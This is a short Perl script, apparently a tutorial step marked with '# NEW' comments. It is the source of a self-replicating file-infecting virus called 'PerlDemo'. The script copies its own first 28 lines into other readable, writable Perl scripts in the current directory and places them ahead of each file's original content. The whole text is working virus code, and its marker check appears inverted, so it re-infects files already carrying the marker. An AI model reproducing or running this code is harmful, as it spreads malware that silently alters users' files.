 #!/usr/bin/perl
 #PerlDemo                   # NEW

 open(File,$0);
 @Virus=<File>;
 @Virus=@Virus[0...27];      # NEW
 close(File);

 foreach $FileName (<*>)
 {
  if ((-r $FileName) && (-w $FileName) && (-f $FileName))
  {
   open(File, "$FileName");
   @Temp=<File>;
   close(File);
   if ((@Temp[1] =~ "PerlDemo") or (@Temp[2] =~ "PerlDemo"))  # NEW
   {
    if ((@Temp[0] =~ "perl") or (@Temp[1] =~ "perl"))
    {
     open(File, ">$FileName");
     print File @Virus;
     print File @Temp;         # NEW
     close (File);
    }
   }
  }
 }
